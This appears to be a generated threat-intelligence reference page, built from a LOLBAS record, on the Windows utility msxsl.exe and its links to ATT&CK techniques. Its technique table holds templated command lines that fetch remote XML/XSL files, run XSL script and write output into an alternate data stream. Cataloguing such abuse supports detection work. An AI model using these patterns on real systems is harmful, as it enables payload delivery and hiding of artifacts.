---
parsed_by: focuslocust
source: lolbas
type: generated
---
# msxsl.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `msxsl.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Msxsl.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Command line utility used to perform XSL transformations.

## Fast Retrieval

- Platform: `windows`
- Command page: [commands](../../commands/windows/msxsl.md)
- Source verification: [source record](../../sources/lolbas/msxsl.exe.md)

## Aliases

- `msxsl.exe`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | explicit | source | Command metadata lists T1105: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH} |
| [T1220 - XSL Script Processing](../../attack/techniques/T1220-xsl-script-processing.md) | explicit | source | Command metadata lists T1220: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xml} |
| [T1564 - Hide Artifacts](../../attack/techniques/T1564-hide-artifacts.md) | explicit | source | Command metadata lists T1564: msxsl.exe {REMOTEURL:.xml} {REMOTEURL:.xsl} -o {PATH}:ads-name |

## Detection / Analysis Notes

This source record contains detection or analysis material. It is preserved on the source-record page rather than promoted into a full detection engineering page.

[source record](../../sources/lolbas/msxsl.exe.md)

## Source Verification

[source record](../../sources/lolbas/msxsl.exe.md)

## Evidence Excerpt

```text
Acknowledgement:
- Handle: '@subtee'
Person: Casey Smith
- Handle: '@r0ns3n'
Person: Ronnie Salomonsen
Author: Oddvar Moe
Commands:
- Category: Execute
```
